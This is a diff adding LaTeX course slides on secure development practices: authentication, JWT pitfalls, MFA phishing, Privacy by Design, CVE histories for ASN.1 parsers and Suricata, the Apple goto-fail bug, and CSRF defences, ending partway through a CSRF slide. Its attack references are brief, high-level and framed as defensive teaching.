@@ -1,0 +1,1951 @@
+\documentclass[Screen16to9,17pt]{foils}
+\usepackage{zencurity-slides}
+\externaldocument{SDL-practices-exercises}
+\selectlanguage{english}
+
+
+% Secure Development Practices
+% Day 1 -- Advanced subjects and details
+% Built from day-0 conventions and reused material from the Software Security course:
+% 5-web-app-hacking-recon (authentication, VictoriaLogs), 8-program-building-blocks,
+% 12-security-design (Privacy by Design, CIS Controls), 6-web-app-hacking-offensive (Log4Shell)
+
+
+\begin{document}
+
+\mytitlepage
+{1. SDL Practices -- Advanced Subjects}
+{Secure Development Practices}
+
+\hlkprofiluk
+
+\slide{Goals for today}
+
+ \hlkimage{4cm}{thomas-galler-hZ3uF1-z2Qc-unsplash.jpg}
+
+Today's goals:
+\begin{list2}
+\item Authentication and authorization -- and privacy by design
+\item Program building blocks -- use the framework, do not reinvent
+\item Containers, Kubernetes and policies
+\item Pipelines are production systems too
+\item Supply chain attacks -- dependencies, build systems and even hardware
+\item Runtime environments and final recommendations
+\end{list2}
+
+  Photo by Thomas Galler on Unsplash
+
+\slide{6-SDL-practices recap}
+
+\begin{list2}
+\item How software fails -- CVE, CWE, OWASP Top 10
+\item Security principles -- least privilege, fail-safe defaults, defense in depth
+\item Code auditing, static and dynamic analysis, testing
+\item Coding standards, Git hooks, scanners, runtime isolation
+\item Secure Development Lifecycle and ISO/IEC 27001:2022 Annex A 8.25--8.30
+\vskip 1em
+\item Today builds on this -- with more details and more real world cases
+\end{list2}
+
+
+\slide{Contents 6-SDL-practices-advanced}
+
+\begin{list2}
+\item Authentication: Tokens, MFA, etc.
+\item Privacy by Design, Secure by Design
+\item Program Building Blocks and Design Patterns
+\item Design with Dependencies in Mind, Design for Faults, Design with Promises in Mind
+\item Container security
+\item Tools and pipelines, Continuous Integration -- with a few examples
+\item Third-party dependencies and examples like Log4Shell
+\item Continuous Vulnerability Management
+\item Building Secure Infrastructures: Separation of development, test and production environments,\\ with examples from Kubernetes
+\item Enhance and secure runtime environment
+\item Logging efficiently -- Maintenance, Monitoring and Analysis of Audit Logs
+\item Optional: Exercises, questions
+\end{list2}
+
+
+\slide{Time schedule}
+
+Plan for the day
+\begin{list1}
+
+\item 12:45 - 13:30 -- Session 0: Authentication and Authorization
+\item 13:45 - 14:30 -- Session 2: Container security and hardening
+\item 14:45 - 15:30 -- Session 3: Tools and pipelines, Session 4: Supply chain and vulnerability management
+\item 15:30 - 16:15 -- Session 4: Runtime environments and exercises
+\item 16:15 - 16:45 -- Exercises
+\end{list1}
+
+From this slide set we skip -- covered elsewhere:\\
+Session 1: Program building blocks and design patterns\\
+Session 5: Runtime environments
+
+
+% ======================================================================
+% Session 0
+% ======================================================================
+
+\slide{Session 0: Authentication and Authorization}
+\begin{list2}
+\item Authentication -- who are you? Passwords, sessions, tokens, MFA and passkeys
+\item Authorization -- what are you allowed to do? Checked on every request
+\item Common failures -- OWASP A01 Broken Access Control and A07 Authentication Failures
+\item Privacy by Design, Secure by Default
+\vskip 1em
+\item Exercise: RBAC access permissions -- check your own GitHub organisation
+\end{list2}
+
+
+\slide{Authentication -- overview}
+
+\begin{list2}
+\item Authentication: who are you? Authorization: what are you allowed to do?
+\item Something you know, something you have, something you are
+\item Common methods on the web:
+  \begin{list2}
+  \item HTTP authentication -- Basic, Digest
+  \item Login forms with session cookies
+  \item Tokens -- API keys, Bearer tokens, JWT
+  \item Federated login -- OAuth 2.0, OpenID Connect, MitID
+  \item Client certificates, multi-factor, passkeys
+  \end{list2}
+\item All of them end up as data in HTTP requests -- which the server must check
+\end{list2}
+
+
+\slide{Login forms and session cookies}
+
+\begin{list2}
+\item Most web applications: HTML form, POST username and password
+\item Server checks credentials, creates a session, returns a cookie:\\
+  \verb+Set-Cookie: session=...; Secure; HttpOnly; SameSite=Lax+
+\item \textbf {The cookie is now the credential -- whoever has it is logged in}
+\item Attacks: session hijacking, session fixation, CSRF, XSS stealing cookies
+\item Session ID must be random, long, changed after login, expired on logout
+\end{list2}
+
+
+\slide{Storing passwords}
+
+\hlkimage{12cm}{salting.png}
+
+\begin{list2}
+\item Never store passwords in clear text
+\item Plain hashes (MD5, SHA-1, SHA-256) are too fast -- easy to brute force
+\item Use a slow, salted password hash: bcrypt, scrypt, Argon2
+\item Salt prevents precomputed tables and identical hashes for identical passwords
+\item Database leaks happen -- design for it
+\end{list2}
+
+
+\slide{Tokens}
+
+\begin{list2}
+\item API keys -- static secret in a header, common for machine-to-machine
+\item Bearer tokens, RFC 6750 -- \verb+Authorization: Bearer <token>+\\
+  whoever holds the token can use it
+\item JWT -- signed claims, see next slide
+\item OAuth 2.0 and OpenID Connect -- tokens issued by a separate identity provider,\\
+  e.g. MitID through a broker
+\item Tokens leak through logs, URLs, browser storage and source code repositories
+\item Short lifetime and narrow scope limit the damage when -- not if -- a token leaks
+\end{list2}
+
+
+\slide{JWT refresher}
+
+\begin{list2}
+\item JSON Web Token, RFC 7519 -- \verb+header.payload.signature+, each base64url
+\item Header: algorithm, e.g. \verb+{"alg":"RS256","kid":"..."}+
+\item Payload: claims -- \verb+iss+, \verb+sub+, \verb+aud+, \verb+exp+, \verb+iat+,\\
+  OIDC ID tokens add \verb+nonce+ and others
+\item Signed, not encrypted -- anyone can read the payload
+\item Classic mistakes: accepting \verb+alg: none+, RS256/HS256 confusion,\\
+  not checking \verb+aud+, \verb+exp+, \verb+iss+
+\end{list2}
+
+\url{https://www.rfc-editor.org/rfc/rfc7519}
+
+
+\slide{Stronger authentication}
+
+\hlkimage{8cm}{yubikey-2018.png}
+\begin{list2}
+\item Multi-factor authentication -- one-time codes, app approval, hardware keys
+\item Passkeys, FIDO2/WebAuthn -- public key cryptography, resistant to phishing
+\item MitID -- app or code display as second factor
+\item Client certificates (mutual TLS) -- the client proves identity during the TLS handshake,\\
+  e.g. OCES certificates for eIndkomst web services
+\end{list2}
+
+
+\slide{Not all MFA is equal -- phishing the second factor}
+
+\begin{list2}
+\item September 2025: npm maintainer of \verb+chalk+ and \verb+debug+ received a fake npm support mail
+\item The mail asked him to ``update'' his 2FA -- the attackers got password \emph{and} one-time code
+\item Result: malicious versions of 18 widely used packages published
+\vskip 1em
+\item One-time codes and app approval can be relayed by a phishing site
+\item Passkeys / FIDO2 are bound to the real domain -- the phishing site gets nothing usable
+\item Require phishing-resistant MFA for accounts that can publish code:\\
+  package registries, Git hosting, CI/CD, cloud consoles
+\end{list2}
+
+
+\slide{Authorization -- checked on every request}
+
+\begin{list2}
+\item OWASP Top 10:2025 -- A01 is Broken Access Control, number one
+\item Being logged in is not the same as being allowed
+\item Role-based Access Control (RBAC) -- roles, not individual users
+\item Deny by default, check on the server -- never trust the client to hide a button
+\item Check object ownership -- IDOR, Insecure Direct Object Reference
+\item Least privilege for services and tokens too -- OAuth scopes, Kubernetes service accounts,\\
+  CI/CD tokens
+\item Centralize the check in the framework -- middleware, decorators, policies\\
+  one implementation is easier to audit than 200 copies
+\end{list2}
+
+
+\slide{Common authentication and authorization failures}
+
+\begin{list2}
+\item OWASP Top 10: A07 Authentication Failures, A01 Broken Access Control
+\item Default, weak or reused passwords, no rate limiting -- credential stuffing
+\item User enumeration through different error messages
+\item Weak password reset -- guessable security questions, tokens that do not expire
+\item Broken session handling -- predictable IDs, no expiry
+\item JWT mistakes -- accepting \verb+alg: none+, not verifying the signature,\\
+  weak HMAC secrets, no check of \verb+exp+ and \verb+aud+
+\item IDOR, Insecure Direct Object Reference -- \verb+/api/basket/5+ works,\\
+  so try \verb+/api/basket/6+ -- logged in, but not checked if it is yours
+\item And: the login check itself can be vulnerable -- remember the Juice Shop SQL injection
+\end{list2}
+
+
+\slide{Authentication methods -- comparison}
+
+{\small
+\begin{tabular}{p{4cm}p{5cm}p{4.2cm}p{7.2cm}}
+\textbf{Method} & \textbf{What is sent} & \textbf{Typical use} & \textbf{Main weaknesses}\\\hline
+HTTP Basic & base64(user:pass) every request & Embedded devices, simple APIs & Password in every request, needs TLS, no logout\\
+HTTP Digest & Hash response to nonce & Embedded devices, IP cameras & Old hash algorithms, rarely supported well\\
+Form + session cookie & Password once, then cookie & Most web applications & Session hijacking, fixation, CSRF\\
+API key & Static secret in header & Machine-to-machine & Long-lived, leaks into code and logs\\
+Bearer token / JWT & Signed token in header & APIs, single page apps & Theft = access, validation mistakes\\
+OAuth 2.0 / OIDC & Redirects, then tokens & Federated login, MitID & Complex, redirect and state handling\\
+Client certificate & Certificate in TLS handshake & B2B, eIndkomst & Certificate management, revocation\\
+Passkeys / MFA & Signature or one-time code & Added on top of login & Account recovery becomes the weak point\\
+\end{tabular}
+}
+
+
+\slide{Recommendation for a modern web application}
+
+\begin{list2}
+\item Do not build it yourself -- use the framework's authentication\\
+  or an established identity provider with OpenID Connect
+\item Browser sessions: server-side session, cookie with \verb+Secure+, \verb+HttpOnly+, \verb+SameSite+
+\item Passwords: Argon2id or bcrypt, rate limiting, check against known breached passwords
+\item Offer MFA, consider passkeys (WebAuthn)
+\item APIs: short-lived tokens, validate signature, \verb+iss+, \verb+aud+, \verb+exp+
+\item Check authorization on every request -- avoid IDOR
+\item Parameterized queries everywhere -- including the login
+\item References: OWASP Authentication Cheat Sheet, Session Management Cheat Sheet, ASVS\\
+  \link{https://cheatsheetseries.owasp.org/}
+\end{list2}
+
+
+\slide{Secure by Design and Secure by Default}
+
+\begin{list2}
+\item 6-SDL-practices: security principles and the ENISA Secure by Design and Default Playbook
+\item Secure by Design -- security is part of the design, not added at the end
+\item Secure by Default -- the default configuration is the secure one
+\begin{list2}
+\item MFA on by default, no default passwords
+\item Logging on by default
+\item Debug endpoints and sample data off in production
+\end{list2}
+\item Most users never change defaults -- so the default \emph{is} the security level
+\item Next: if the application is secure, what about the personal data it handles?
+\end{list2}
+
+
+\slide{Privacy by Design}
+
+\begin{quote}
+Objectives of the report\\
+This report shall promote the discussion on how privacy by design can be implemented with the help
+of engineering methods. It provides a basis for better understanding of the current state of the art
+concerning privacy by design with a focus on the technological side.
+
+“Personal data” means any information relating to an identified or identifiable natural person—for a
+detailed discussion see [19]. This is related to the term personally identifiable information (PII), as e.g.
+used in the privacy framework standardised by ISO/IEC [125].
+\end{quote}
+
+Source: Privacy and Data Protection by Design -- from policy to engineering\\
+{\footnotesize\url{https://www.enisa.europa.eu/publications/privacy-and-data-protection-by-design}}
+
+\begin{list2}
+\item GDPR Article 25 -- data protection by design and by default is a legal requirement in the EU
+\end{list2}
+
+
+\slide{Privacy Protection Goals}
+
+\begin{quote}\footnotesize
+In ICT
+security the triad of confidentiality, integrity, and availability has been widely accepted. ...
+As complement to these security protection goals, three privacy-specific protection goals were pro-
+posed in 2009 [172], namely unlinkability, transparency, and intervenability.
+\end{quote}
+
+\begin{list2}
+\item {\small \emph{Unlinkability}. Unlinkability ensures that privacy-relevant data cannot be linked across domains that are constituted by a common purpose and context, and that means that processes have to be oper-
+ated in such a way that the privacy-relevant data are unlinkable to any other set of privacy-
+relevant data outside of the domain.}
+\item {\small \emph{Transparency.} Transparency ensures that all privacy-relevant data processing including the
+legal, technical and organisational setting can be understood and reconstructed at any time.
+The information has to be available before, during and after the processing takes place. Thus,
+transparency has to cover not only the actual processing, but also the planned processing (ex-
+ante transparency) and the time after the processing has taken place to know what exactly
+happened (ex-post transparency).}
+\item {\small \emph{Intervenability.} Intervenability ensures intervention is possible concerning all ongoing or
+planned privacy-relevant data processing, in particular by those persons whose data are pro-
+cessed. The objective of intervenability is the application of corrective measures and counter-
+balances where necessary.}
+\end{list2}
+Source: Privacy and Data Protection by Design -- from policy to engineering
+
+
+\slide{Data oriented strategies}
+
+\begin{list2}
+\item Strategy \#1: MINIMISE\\
+The most basic privacy design strategy is MINIMISE, which states that the amount of personal data
+that is processed should be restricted to the minimal amount possible.
+\item Strategy \#2: HIDE\\
+The second design strategy, HIDE, states that any personal data, and their interrelationships, should
+be hidden from plain view.
+\item Strategy \#3: SEPARATE\\
+The third design strategy, SEPARATE, states that personal data should be processed in a distributed
+fashion, in separate compartments whenever possible.
+\item Strategy \#4: AGGREGATE\\
+The fourth design pattern, AGGREGATE, states that Personal data should be processed at the highest
+level of aggregation and with the least possible detail in which it is (still) useful.
+\end{list2}
+
+Source: Privacy and Data Protection by Design -- from policy to engineering
+
+
+
+\slide{Privacy Impact Assessment (PIA)}
+
+\begin{quote}\small
+Privacy-by-design er en tilgang, der sikrer, at virksomheden indarbejder databeskyttelse som en integreret del af virksomhedens forretningsprocesser, værdikæde og produktlivscyklus. Lige fra produktionsfasen til at produktet havner hos slutbrugeren.
+...
+Udarbejd en konsekvensanalyse (PIA)\\
+En god tilgang til at sikre privacy-by-design/default er, at udarbejde en konsekvensanalyse også kaldet en PIA (Privacy Impact Assessment), der tydeliggør konsekvenserne af virksomhedens databehandling.
+\end{quote}
+
+En PIA skal som minimum indeholde følgende:
+
+\begin{list2}
+\item En beskrivelse af de påtænkte databehandlinger og deres formål.
+\item En vurdering af behandlingens nødvendighed og proportionalitet.
+\item En vurdering af risikoen for de personer, hvis persondata bliver behandlet.
+\item Foranstaltninger til at imødegå risici og demonstrere overholdelse af persondataforordningen.
+\end{list2}
+
+Source: IT-Branchen: Privacy-by-design/default\\ \url{https://itb.dk/persondataforordningen/privacy-by-design-default/}
+
+
+\slide{Exercise: RBAC access permissions -- check your own GitHub}
+
+Look at the real permissions in your own organisation -- not the documentation alone:
+\begin{list2}
+\item Open your organisation on GitHub, or a repository you work on
+\item Who are owners and admins? How many people can change repository settings?
+\item Are there outside collaborators? Do they still need access?
+\item Which teams have Write, Maintain or Admin?
+\item Is the default branch protected -- can anyone push directly to it?
+\item Deploy keys -- who has the private key, and is it still needed?
+\end{list2}
+
+GitHub repository roles, from least to most access: Read, Triage, Write, Maintain, Admin\\
+{\footnotesize\link{https://docs.github.com/articles/repository-permission-levels-for-an-organization}}
+
+Note: the settings also influence your CI/CD pipelines!
+
+\breakdance
+
+
+% ======================================================================
+% Session 1
+% ======================================================================
+
+\slide{Session 1: Program building blocks and design patterns}
+\begin{list2}
+\item Design patterns and common constructs -- programs solve the same problems again and again
+\item Auditing code patterns -- variable relationships, structures, uninitialized data, control flow
+\item Design for Faults, Design with Dependencies in Mind, Design with Promises in Mind
+\item Use the security building blocks in your framework -- CSRF, escaping, ORM
+\vskip 1em
+\item Exercise: CSRF protection in Django and the OWASP CSRF patterns
+\end{list2}
+
+
+\slide{Design Patterns}
+
+\begin{list2}
+\item \emph{Design Patterns: Elements of Reusable Object-Oriented Software} (1994), Erich Gamma, Richard Helm, Ralph Johnson, and John Vlissides\\
+The book describes 23 classic software design patterns\\
+\url{https://en.wikipedia.org/wiki/Design_Patterns}
+
+\item Ideas of patterns precede this book, but became a more popular subject
+\item Patterns can also be found in other areas, like patterns in network architecture
+\item Security patterns too -- authentication, authorization, input validation, secure logging
+\end{list2}
+
+
+\slide{Common constructs}
+
+Programs exhibit the same patterns, some examples:
+\begin{list2}
+\item Solve problems in the same domains
+\item Need to store lists of strings / characters etc.
+\item Data structures becomes useful in other programs
+\item Sorting routines needed in many programs
+\item Parsing input -- configuration files, protocols, file formats
+\vskip 1em
+\item Same constructs -- same mistakes, in many programs
+\end{list2}
+
+
+
+\slide{ASN.1 parsing CVEs -- 2003 to 2019}
+
+\begin{list2}
+\item CVE-2003-0818 Microsoft MSASN1.DLL (MS04-007), CVSS 9.8:
+      BER length integer overflows, RCE via Kerberos, NTLM, IPsec, TLS\\
+\url{https://docs.microsoft.com/en-us/security-updates/securitybulletins/2004/ms04-007}
+\item CVE-2016-2053 Linux kernel, CVSS 4.7: panic in \verb+asn1_ber_decoder+\\
+\url{https://github.com/torvalds/linux/commit/0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f}
+\item CVE-2016-2108 OpenSSL, CVSS 9.8: ``negative zero'',
+      memory corruption via crafted ANY field\\
+\url{https://nvd.nist.gov/vuln/detail/CVE-2016-2108}
+\item CVE-2016-5080 Objective Systems ASN1C (Cisco ASR 5000), CVSS 9.8:
+      integer overflow in compiler-generated code\\
+      \url{https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-20160721-asn1c.html}
+\item CVE-2019-9162 Linux kernel, CVSS 7.8: missing ASN.1 length checks
+      in SNMP NAT helper, OOB read/write\\
+      \url{https://bugs.chromium.org/p/project-zero/issues/detail?id=1776}
+\end{list2}
+
+Need a rabbit hole, check out ASN.1 parsing, parsing anything is hard!
+
+\slide{ASN.1 parsing CVEs -- 2021 to 2025}
+
+\begin{list2}
+\item CVE-2021-43527 Mozilla NSS ``BigSig'', CVSS 9.8: heap overflow on
+      oversized DER-encoded signature\\
+      \url{https://nvd.nist.gov/vuln/detail/CVE-2021-43527}
+\item CVE-2022-44640 Heimdal Kerberos KDC, CVSS 9.8: invalid free on
+      crafted DER CHOICE, generated by its ASN.1 compiler
+      \url{https://github.com/heimdal/heimdal/security/advisories/GHSA-88pm-hfmq-7vv4}
+\item CVE-2023-0286 OpenSSL, CVSS 7.4: X.400 address type confusion
+      in GeneralName, attacker pointers to \verb+memcmp+\\
+      \url{https://www.openssl.org/news/secadv/20230207.txt}
+\item CVE-2024-12133 libtasn1, CVSS 5.3: many SEQUENCE OF/SET OF
+      elements, quadratic decoding, DoS\\
+      \url{https://gitlab.com/gnutls/libtasn1/-/issues/52}
+\item CVE-2025-0343 Swift ASN.1, CVSS 7.5: primitive vs.\ constructed
+      form not enforced, crash on crafted BER/DER\\
+      \url{https://nvd.nist.gov/vuln/detail/CVE-2025-0343}
+\item CVE-2025-13151 libtasn1, CVSS 7.5 (upstream: Low): one-byte
+      stack overflow in \verb+asn1_expand_octet_string+\\
+      \url{https://gitlab.com/gnutls/libtasn1/-/issues/55}
+\end{list2}
+
+\begin{list1}
+\item Same bug class for 20+ years: trusting length, type and form fields
+\end{list1}
+
+
+
+\slide{Auditing code patterns}
+
+\begin{minted}{c}
+struct buffer {
+    char   *data;
+    size_t  size;              /* must match allocation */
+};
+\end{minted}
+
+\begin{list2}
+\item {\bf Variable Relationship}
+\item An example are C buffers
+\item A variable-pointer to the buffer and the variable with the length
+\item Their relationship can easily get invalidated, leading to vulnerabilities
+\item Question: would object oriented programming help?
+\end{list2}
+
+
+\slide{Structure and Object Mismanagement}
+
+\begin{list2}
+\item Structures in C can help group related data elements
+\item Both auditors and attackers can benefit ...
+\item Object oriented programs and languages encapsulate this
+\item Responsibility is on the object implementation, good!
+\end{list2}
+
+
+\slide{Uninitialized Variables}
+
+\begin{minted}[fontsize=\footnotesize]{c}
+    Packet *p = SCMalloc(SIZE_OF_PACKET);
+    if (unlikely(p == NULL)) {
+         return 0;
+    }
+    ThreadVars tv;
+    DecodeThreadVars dtv;
+
+    memset(&dtv, 0, sizeof(DecodeThreadVars));
+    memset(&tv,  0, sizeof(ThreadVars));
+    memset(p, 0, SIZE_OF_PACKET);
+\end{minted}
+
+\begin{list2}
+\item Always make sure variables have well defined values.
+\item Defensive program above use memset to clear contents of buffers
+\item Example from Suricata allocating memory, checking it got the memory, clearing contents
+\end{list2}
+
+
+\slide{Manipulating Lists - and other data structures}
+
+\begin{list2}
+\item Storing data in a list is nice, can add and remove elements
+\item Single linked list, start from head and go through list ... slow
+\item Double linked list can go back again from element
+\item More work updating, moving more pointers ... complex, may introduce errors
+\item Multiple problems can arise, also using the wrong structure for something can result in vulnerabilities
+\end{list2}
+
+\vskip 1cm
+\centerline{Do not write your data structure libraries yourself}
+
+
+\slide{Control Flow}
+
+\hlkimage{16cm}{ssl-tls-breaks-timeline.png}
+
+\begin{list2}
+\item If constructs, make sure to exercise each path
+\item Case/switch constructs, make sure to catch a default
+\item Loops being subverted to create buffer overflow, terminating conditions
+\item Forgetting a \verb+break+ in a case
+\item Picture selected due to the Apple goto fail -- certificate validation\\
+\link{https://dwheeler.com/essays/apple-goto-fail.html}
+\end{list2}
+
+
+
+\slide{Apple Goto Fail CVE-2014-1266}
+
+\begin{minted}[fontsize=\footnotesize]{c}
+if ((err = SSLHashSHA1.update(&hashCtx, &clientRandom)) != 0)
+    goto fail;
+if ((err = SSLHashSHA1.update(&hashCtx, &serverRandom)) != 0)
+    goto fail;
+if ((err = SSLHashSHA1.update(&hashCtx, &signedParams)) != 0)
+    goto fail;
+    goto fail;  /* MISTAKE THIS LINE SHOULD NOT BE HERE */
+if ((err = SSLHashSHA1.final(&hashCtx, &hashOut)) != 0)
+    goto fail;
+\end{minted}
+
+\begin{list2}
+\item Always going to goto fail, second goto is always active
+\item Leading to later checks not performed
+\item Compiler warnings for unreachable code and mandatory braces in the coding standard
+\item Example code from\emph{Anatomy of a “goto fail” – Apple’s SSL bug explained}\\ {\footnotesize\url{https://nakedsecurity.sophos.com/2014/02/24/anatomy-of-a-goto-fail-apples-ssl-bug-explained-plus-an-unofficial-patch/}}
+\end{list2}
+
+
+\slide{Side effects, corner cases and 32-bit vs 64-bit}
+
+\begin{list2}
+\item Functions can change variables in global scope while doing something
+\item Allocating memory can go wrong, check return values
+\item Asking for 0 bytes of memory is technically legal but may cause problems
+\item Doing 64-bit check with if and then being truncated to 32-bit when doing actual memory allocation function, result in unintended behaviour
+\item Double free is also problematic, freeing an already free location may exploit heap management routines\\
+Check malloc and free very carefully
+\end{list2}
+
+
+\slide{Who do you trust?}
+
+\begin{list2}
+\item Example programs with flaws: OpenSSH, OpenSSL, Microsoft Windows, Linux
+\item Who do you trust?
+\item Can we trust any software?
+
+\item What about Suricata? - CVE list\\
+{\footnotesize\url{https://www.cvedetails.com/vulnerability-list/vendor_id-13364/product_id-27771/Openinfosecfoundation-Suricata.html}}
+\item Spoiler: Bypass vulnerabilities, getting data past the IDS, Denial of Service crashing the IDS
+\item Trust is also a design decision -- more on supply chain later
+\end{list2}
+
+\slide{Suricata IDS -- older CVEs}
+
+\begin{list2}
+\item CVE-2013-5919 Suricata < 1.4.6, CVSS 5.0: crash on malformed SSL record\\
+      \url{https://www.cvedetails.com/cve/CVE-2013-5919/}
+\item CVE-2014-6603 Suricata < 2.0.4, CVSS 5.0: crafted SSH banner, rule bypass,
+      large allocation or OOB write\\
+      \url{https://www.cvedetails.com/cve/CVE-2014-6603/}
+\item CVE-2015-0971 Suricata < 2.0.8, CVSS 5.0: DER parser crash via
+      SSL/TLS certificates\\
+      \url{https://www.cvedetails.com/cve/CVE-2015-0971/}
+\item CVE-2015-8954 Suricata < 2.0.6, CVSS 9.8: \verb+MemcmpLowercase+ skips
+      first byte, IPS bypass via crafted HTTP\\
+      \url{https://www.cvedetails.com/cve/CVE-2015-8954/}
+\item CVE-2017-7177 Suricata < 3.2.1, CVSS 7.5: IPv4 defrag evasion,
+      IP protocol not checked when matching fragments\\
+      \url{https://www.cvedetails.com/cve/CVE-2017-7177/}
+\item CVE-2017-15377 Suricata < 4.x, CVSS 7.5: redundant content checks
+      until recursion limit (3000), DoS\\
+      \url{https://www.cvedetails.com/cve/CVE-2017-15377/}
+\end{list2}
+
+\slide{Suricata IDS -- selected CVEs}
+
+\begin{list2}
+\item CVE-2018-6794 Suricata < 4.0.4, CVSS 5.3: TCP data before handshake,
+      HTTP response signatures bypassed (Snort 2.9.4 too)\\
+      \url{https://www.exploit-db.com/exploits/44247}
+\item CVE-2024-32664 Suricata, CVSS 5.3: base64 out-of-bounds write
+      via crafted traffic or datasets\\
+      \url{https://github.com/OISF/suricata/security/advisories/GHSA-79vh-hpwq-3jh7}
+\item CVE-2024-37151 Suricata, CVSS 7.5: fragments reusing IP ID break
+      reassembly, policy bypass\\
+      \url{https://github.com/OISF/suricata/security/advisories/GHSA-qrp7-g66m-px24}
+\item CVE-2025-59147 Suricata, CVSS 7.5: crafted multiple SYNs, TCP
+      detection bypass\\
+      \url{https://bugzilla.redhat.com/show_bug.cgi?id=2400928}
+\item CVE-2025-64330 Suricata, CVSS 7.5: heap over-read logging verdict
+      in eve.alert (non-default config)\\
+      \url{https://github.com/OISF/suricata/security/advisories/GHSA-83v7-gm34-f437}
+\end{list2}
+
+\begin{list1}
+\item An IDS must parse hostile traffic -- and agree with the endpoint on how it should be understood
+\end{list1}
+
+\slide{Building distributed systems is hard}
+
+\hlkimage{6cm}{microservices-java-book.png}
+
+\begin{quote}\small
+  Microservice architecture (MSA) is an approach to building software systems that decomposes business domain models into smaller,
+  consistent, bounded-contexts implemented by services. These services are isolated and autonomous yet communicate to provide some
+  piece of business functionality. Microservices are typically implemented and operated by small teams with enough autonomy that
+  each team and service can change its internal implementation
+  details (including replacing it outright!) with minimal impact across
+  the rest of the system.
+\end{quote}
+
+Source: {\footnotesize\\
+Microservices for Java Developers , Christian Posta, 2016 O’Reilly}
+
+
+\slide{Design for Faults}
+
+\begin{quote}
+  Things will fail, so we must develop our applications to be resilient and handle failure, not just prevent it. We should
+  be able to deal with faults gracefully and not let faults propagate to
+  total failure of the system.
+
+  Building distributed systems is different from building shared-
+memory, single process, monolithic applications. One glaring differ‐
+ence is that communication over a network is not the same as a local
+call with shared memory.
+\end{quote}
+
+\begin{list2}
+\item Networks are inherently unreliable
+\item Security view: fail securely -- a timeout must not become an open door
+\end{list2}
+Source: {\footnotesize\\
+Microservices for Java Developers , Christian Posta, 2016 O’Reilly}
+
+
+\slide{Design with Dependencies in Mind}
+
+\begin{quote}
+  To be able to move fast and be agile from an organization or
+  distributed-systems standpoint, we have to design systems with
+  dependency thinking in mind; we need loose coupling in our teams,
+  in our technology, and our governance.
+\end{quote}
+
+\begin{list2}
+\item Every dependency is code you did not write, but you run with your privileges
+\item Loose coupling also limits the blast radius when a dependency goes bad
+\end{list2}
+
+Source: {\footnotesize\\
+Microservices for Java Developers , Christian Posta, 2016 O’Reilly}
+
+
+\slide{Design with Promises in Mind}
+
+\begin{quote}
+  In a microservice environment with autonomous teams and services, it’s very important to keep in mind the relationship between
+  service provider and service consumer. As an autonomous service
+  team, you cannot place obligations on other teams and services
+  because you do not own them; they’re autonomous by definition. All
+  you can do is choose whether or not to accept their promises of
+  functionality or behavior. As a provider of a service to others, all you
+  can do is promise them a certain behavior.
+\end{quote}
+
+\begin{list2}
+\item Promises as published by APIs and versions in those!
+\item References \emph{Consumer-Driven Contracts: A Service Evolution Pattern}\\
+\link{https://martinfowler.com/articles/consumerDrivenContracts.html}
+\end{list2}
+Source: {\footnotesize\\
+Microservices for Java Developers , Christian Posta, 2016 O’Reilly}
+
+
+\slide{Versioning and Compatibility}
+
+\begin{list2}
+\item Backwards Compatibility\\
+A backwards-compatible change to a REST-compliant service contract might involve adding some new resources or adding new capabilities to existing resources. In each of these cases the existing service consumers will only invoke the old methods on the old resources, which continue to work as they previously did.
+\item Forwards Compatibility\\
+When a service contract is designed in such a manner so that it can support a range of future consumer programs, it is considered to have an extent of forwards compatibility. This means that the contract can essentially accommodate how consumer programs will evolve over time.
+\item Security view: old API versions kept for compatibility are attack surface too
+\end{list2}
+
+Source: {\footnotesize\\
+\emph{Service‑Oriented Architecture: Analysis and Design for Services and Microservices}, Thomas Erl, 2017}
+
+
+\slide{Use the security building blocks in your framework}
+
+\begin{list2}
+\item Modern frameworks include security functions -- use them, do not write your own
+\item Output encoding / escaping -- templates escape by default, e.g. Django, Angular
+\item Database access -- ORM and parameterized queries prevent SQL injection
+\item CSRF tokens -- middleware, enabled by default in many frameworks
+\item Authentication, password hashing, session handling
+\item Input validation -- validators for e-mail, URLs, dates, ...
+\vskip 1em
+\item The dangerous part: the escape hatches -- \verb+raw()+ SQL, \verb+|safe+ in templates,\\
+\verb+@csrf_exempt+ -- grep for them in code review
+\end{list2}
+
+CSRF is used here as an example of something \emph{complex} which is \emph{easy} using frameworks
+
+\slide{Cross-Site Request Forgery (CSRF)}
+
+\begin{quote}
+CSRF attacks take advantage of the way browsers operate and the trust relationship between a website and the browser. By finding API calls that rely on this relationship to ensure security—but yield too much trust to the browser—we can craft links and forms that with a little bit of effort can cause a user to make requests on his or her own behalf—unknown to the user generating the request.
+\end{quote}
+Source: \emph{Web Application Security}, Andrew Hoffman, chapter 11
+
+\begin{list2}
+\item The browser sends the cookies automatically -- the server sees a logged in user
+\item Often seen in small CPE routers in homes, if the user activates an evil link, their router might be reconfigured or taken over
+\end{list2}
+
+\slide{CSRF in real software -- attacker gets access}
+
+\begin{list2}
+\item CVE-2019-9787 WordPress < 5.1.1, CVSS 8.8: CSRF on comments $\rightarrow$
+      stored XSS $\rightarrow$ admin $\rightarrow$ edit .php files, RCE\\
+      \url{https://blog.ripstech.com/2019/wordpress-csrf-to-rce/}
+\item CVE-2022-21703 Grafana, CVSS 8.8: admin tricked into inviting attacker
+      as high-privilege user, SameSite alone not enough\\
+      \url{https://access.redhat.com/security/cve/CVE-2022-21703}
+\item CVE-2007-6642 Joomla! < 1.5 RC4: add Super Admin, upload
+      extension with PHP code\\
+      \url{https://intel.intruder.io/cves/CVE-2007-6642}
+\end{list2}
+
+
+\slide{OWASP CSRF Prevention Cheat Sheet -- patterns}
+
+\begin{list2}
+\item First: check if your framework has built-in CSRF protection -- and use it
+\item Otherwise: CSRF tokens on all state-changing requests, validated on the server
+\item Stateful software: \emph{synchronizer token pattern} -- token stored in the session
+\item Stateless software: \emph{double submit cookie} -- preferably the signed variant
+\item Modern browsers: \emph{Fetch Metadata} headers like \verb+Sec-Fetch-Site+ can block cross-site requests
+\item Defense in depth: \verb+SameSite+ cookies, checking \verb+Origin+ -- not alone
+\item No XSS -- an XSS vulnerability can defeat all of the above
+\item Never change state with \verb+GET+
+\end{list2}
+
+{\footnotesize\link{https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html}}
+
+\slide{CSRF defenses -- two token patterns}
+
+\begin{list2}
+\item Stateful software: \emph{synchronizer token pattern} -- token stored in the session
+\begin{list2}
+\item Server generates random token, embeds it in forms/headers
+\item Request rejected unless submitted token matches the session copy
+\end{list2}
